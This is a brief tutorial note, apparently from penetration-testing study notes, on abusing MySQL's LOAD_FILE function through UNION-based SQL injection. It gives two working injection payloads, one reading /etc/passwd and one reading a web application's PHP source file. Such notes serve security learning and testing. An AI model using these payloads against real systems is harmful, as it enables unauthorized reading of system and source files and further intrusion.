using the Load_file function we can inject it into the query and select a file we wanna read. 

we can use a union injection like this:
<span style="color:rgb(255, 0, 0)">' union select null,Load_file("/etc/passwd"),null,null-- -</span> 
to read /etc/passwd

we can also use it to read source code of certain files like a search.php file: 

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
